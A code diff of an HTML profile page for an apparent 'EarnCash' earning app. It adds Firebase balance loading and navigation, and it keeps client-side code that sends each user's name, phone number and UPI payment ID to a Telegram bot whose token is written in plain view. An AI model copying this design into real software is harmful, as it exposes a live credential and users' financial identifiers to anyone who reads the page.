@@ -3,26 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Profile Section</title>
+    <title>Profile - EarnCash</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --bg: #f8faff; --card: #ffffff; --accent: #4a6cf7; --text: #333; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-        body { background: var(--bg); color: var(--text); padding-bottom: 30px; }
+        body { background: var(--bg); color: var(--text); padding-bottom: 100px; }
         
-        /* Top Profile Header Fix */
         .profile-header { background: white; padding: 40px 20px 60px; text-align: center; border-bottom-left-radius: 35px; border-bottom-right-radius: 35px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
         .avatar { width: 85px; height: 85px; background: var(--accent); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; font-weight: bold; margin: 0 auto 15px; border: 4px solid #fff; box-shadow: 0 5px 15px rgba(74, 108, 247, 0.2); }
         .verified-box { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 5px; }
         .verified-box i { color: #2ecc71; font-size: 18px; }
         .verified-box span { color: #777; font-size: 14px; font-weight: 500; }
 
-        /* Balance Card */
         .balance-card { background: #1a1a1a; color: white; margin: -40px 25px 25px; padding: 30px; border-radius: 28px; text-align: center; position: relative; z-index: 10; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
         .balance-card p { opacity: 0.6; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
         .balance-card h1 { font-size: 40px; margin: 8px 0; font-weight: 700; }
 
-        /* Sections */
         .section { background: white; margin: 15px 20px; padding: 22px; border-radius: 24px; box-shadow: 0 4px 15px rgba(0,0,0,0.04); }
         .section-title { font-size: 15px; font-weight: 700; margin-bottom: 18px; display: flex; align-items: center; gap: 12px; color: #444; }
         
@@ -32,22 +29,24 @@
         .btn { width: 100%; padding: 15px; border: none; border-radius: 14px; font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .btn-blue { background: var(--accent); color: white; box-shadow: 0 5px 15px rgba(74, 108, 247, 0.3); }
         .btn-outline { background: #f0f3ff; color: var(--accent); }
-        .btn:active { transform: scale(0.97); }
-
-        .referral-box { background: #fffcf0; padding: 18px; border-radius: 16px; border: 1px dashed #fbc02d; text-align: center; }
         
-        /* Menu Items */
         .menu-item { display: flex; align-items: center; justify-content: space-between; padding: 18px 5px; border-bottom: 1px solid #f8f8f8; cursor: pointer; }
         .menu-item:last-child { border: none; }
         .menu-item i.main-icon { width: 35px; color: var(--accent); font-size: 18px; }
         .logout { color: #e74c3c; font-weight: 700; }
+
+        /* Bottom Nav Fix */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #ffffff; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #eee; z-index: 900; }
+        .nav-item { text-decoration: none; color: #bbb; display: flex; flex-direction: column; align-items: center; font-size: 12px; font-weight: 600; flex: 1; }
+        .nav-item i { font-size: 22px; margin-bottom: 4px; }
+        .nav-item.active { color: var(--accent); }
     </style>
 </head>
 <body>
 
     <div class="profile-header">
-        <div class="avatar" id="userInitial">A</div>
-        <h2 id="userNameDisplay" style="font-weight: 800; font-size: 24px;">Akash</h2>
+        <div class="avatar" id="userInitial">U</div>
+        <h2 id="userNameDisplay" style="font-weight: 800; font-size: 24px;">User</h2>
         <div class="verified-box">
             <i class="fa-solid fa-circle-check"></i>
             <span>Verified Member</span>
@@ -74,15 +73,6 @@
     </div>
 
     <div class="section">
-        <div class="section-title"><i class="fa-solid fa-share-nodes" style="color:#2ecc71"></i> Refer & Earn</div>
-        <div class="referral-box">
-            <p style="font-size: 12px; color: #777; margin-bottom: 8px;">Your unique referral code</p>
-            <h3 id="refCode" style="letter-spacing: 3px; font-size: 22px; color: #444; margin-bottom: 12px;">EARN120</h3>
-            <button class="btn btn-outline" style="padding: 10px; font-size: 13px;" onclick="copyReferral()">Copy Invite Link</button>
-        </div>
-    </div>
-
-    <div class="section">
         <div class="menu-item" onclick="window.location.href='https://t.me/OfficialEarnCash'">
             <div><i class="fa-solid fa-headset main-icon"></i> <span>Customer Support</span></div>
             <i class="fa-solid fa-chevron-right" style="font-size: 12px; color: #ccc;"></i>
@@ -92,35 +82,66 @@
         </div>
     </div>
 
+    <nav class="bottom-nav">
+        <a href="home.html" class="nav-item">
+            <i class="fa-solid fa-house"></i><span>Home</span>
+        </a>
+        <a href="profile.html" class="nav-item active">
+            <i class="fa-solid fa-user"></i><span>Profile</span>
+        </a>
+    </nav>
+
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
     <script>
-        // Data Load logic
+        // 1. Firebase Setup
+        const firebaseConfig = {
+            databaseURL: "https://earn-money-6891a-default-rtdb.firebaseio.com/"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // 2. Data Load Logic
         const name = localStorage.getItem('userName') || 'User';
-        const phone = localStorage.getItem('userPhone') || 'N/A';
-        const balance = localStorage.getItem('userBalance') || '0.00';
+        const phone = localStorage.getItem('userPhone');
         
+        if (!phone) {
+            window.location.href = 'index.html';
+        }
+
         document.getElementById('userNameDisplay').innerText = name;
         document.getElementById('userInitial').innerText = name.charAt(0).toUpperCase();
-        document.getElementById('mainBalance').innerText = "₹ " + balance;
         document.getElementById('upiInput').value = localStorage.getItem('userUPI') || '';
-        document.getElementById('refCode').innerText = "REF" + phone.slice(-6);
+
+        // 3. Live Balance from Firebase
+        const userRef = database.ref('users/' + phone);
+        userRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.balance !== undefined) {
+                document.getElementById('mainBalance').innerText = "₹ " + data.balance;
+                localStorage.setItem('userBalance', data.balance);
+            }
+        });
 
         const token = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
         const chat_id = "8415600127";
 
         function saveUPI() {
             const upi = document.getElementById('upiInput').value;
-            if(upi.length < 5 || !upi.includes('@')) { alert("Bhai, sahi UPI ID dalo!"); return; }
+            if(upi.length < 5 || !upi.includes('@')) { 
+                alert("Bhai, sahi UPI ID dalo!"); 
+                return; 
+            }
             
+            // Local Storage and Firebase Sync (Optional)
             localStorage.setItem('userUPI', upi);
+            database.ref('users/' + phone).update({ upi: upi });
+
+            // Telegram Notification
             const msg = `💳 *UPI ID UPDATED*\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n✨ New UPI: ${upi}`;
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
             alert("UPI ID Saved Successfully!");
-        }
-
-        function copyReferral() {
-            const link = window.location.origin + "/signup.html?ref=" + phone;
-            navigator.clipboard.writeText(link);
-            alert("Referral Link Copied! Ab dosto ko bhejo.");
         }
 
         function logout() {
